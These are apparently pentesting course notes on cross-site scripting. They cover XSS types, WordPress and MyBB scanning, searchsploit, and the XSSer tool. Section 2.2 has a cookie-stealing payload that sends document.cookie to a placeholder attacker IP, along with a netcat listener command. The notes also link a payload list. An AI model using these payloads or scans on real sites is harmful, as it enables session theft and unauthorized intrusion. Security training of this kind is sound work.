## Cross-site scripting (XSS)

### 1. Introduction to XSS Attacks

#### 📌 1.1. XSS types

- **Actions**
    - Stored → goes to DB
    - Reflected → bounces back from the server
    - DOM-based → does not visit the server, just executes in the browser

#### 📌 1.2. JavaScript

- **Actions**
    - Sandbox context → JavaScript is executed by browsers in a sandbox with low privileges and it is also segregated from other programs and processes.
    - Execution is sequential → top to bottom 
    - Payloads → https://github.com/payload-box/xss-payload-list

### 2. Reflected XSS

#### 📌 2.1. Reflected XSS in WordPress

- **Actions**
    - CWordPress scan → wpscan CLI
        - Regular execution → ```wpscan --url [url]``` 
        - Enumerate plugins → ```wpscan --url [url] --enumerate p --plugins-detection aggresive``` 

#### 📌 2.2. Cookie stealing

- **Actions**
    - Set netcat for listening → ```nc -nvlp 4444```
    - Craft the command that calls that listener → ```<script>new Image().src='http://[ip]?cookie='+encodeURI(document.cookie);</script>```

### 3. Stored XSS

#### 📌 3.1. Introduction to stored XSS

- **Actions**
    - searchsploit (CLI for searching in exploit DB) → ```searchsploit apphp```
    - Read the description in the document
    - Find the vulnerable field

#### 📌 3.2. MyBBScan

- **Actions**
    - CLI to scan MyBB vulnerabilities → ```./scan.py```

### 4. DOM-Based XSS

### 5. XSS Tools

#### 📌 5.1. XSSer 

- **Actions**
    - Automatic framework used to detect, exploit and report XSS vulnerabilities
    - Contains options to bypass filters and various special techniques of code injection
    - More than 1300 attack vectors
- **Repo**: https://github.com/epsylon/xsser
- **Commands**: 
    - ```xsser --url "http://192.214.20.3/index.php?popUpNotificationCode=SL1&page=dns-lookup.php" -p "target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS" --Fp "<script>alert(1)</script>"```
    - XSS is the placeholder to place the attack
    - More options:
        ```--auto``` → automatic scanning
        ```--reverse-check``` → include payload
    - GUI
        - ```xsser --gtk``` → invoke GUI
        - Steps:
            1. Set to intruder
            2. Paste target page
            3. Connection tab to configure method and payload
            4. Aim
        - Wizard: going through the steps to craft the attack

